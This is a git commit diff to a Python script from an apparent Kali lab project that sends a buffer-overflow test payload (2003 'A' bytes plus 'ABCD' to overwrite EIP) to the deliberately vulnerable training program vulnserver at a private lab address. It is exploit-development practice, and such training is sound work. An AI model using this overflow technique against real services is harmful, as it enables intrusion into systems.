e5a55b6b088ed9a5075d5fbcb6d079d82b18b87a
Henry Post <henryfbp@gmail.com>
2020-04-07 13:19:02 -0500

    rename shellcode as it is simple

--- vagrant/kali/shared/Projects/vulnserver/shellcode-ABCD.py
+++ vagrant/kali/shared/Projects/vulnserver/shellcode-ABCD.py
@@ -3,7 +3,7 @@
 import sys, socket
 
 shellcode = ('A' * 2003)  # 2003 because pattern_offset.rb with 3200 length found 386F4337 as a val at position 2003
-shellcode += ('B' * 4)  # this should fill the EIP register in vulnserver with 'B' character
+shellcode += 'ABCD'  # this should fill the EIP register in vulnserver with 'ABCD' character aka 41 42 43 44
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.33.16', 9999))
